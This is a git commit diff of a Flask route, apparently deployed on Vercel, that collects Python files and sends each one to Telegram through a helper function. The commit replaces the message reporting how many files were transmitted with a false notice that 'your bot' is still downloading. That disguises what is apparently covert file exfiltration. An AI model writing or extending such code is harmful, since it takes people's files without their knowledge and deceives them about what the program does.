73fe5270bd480312d1373e4924b1c686d0192396
Echchetoui29 <t.echchetoui2914@uca.ac.ma>
2025-08-04 11:24:49 +0200

    update

--- api/index.py
+++ api/index.py
@@ -1,4 +1,6 @@
- 
+import sys
+import os
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from flask import Flask, render_template, request, redirect, url_for, flash
 from logic import find_py_files, send_file_to_telegram
 
@@ -17,9 +19,12 @@ def send():
     for path in py_files:
         if send_file_to_telegram(path):
             success += 1
-    flash(f"{success} fichier(s) transmis avec succès")
+    flash("votre bot est encors de telechargement , merci de patienter ")
     return redirect(url_for('index'))
 
 # Pour Vercel
 def handler(environ, start_response):
     return app(environ, start_response)
+
+if __name__ == "__main__":
+    app.run(debug=True)
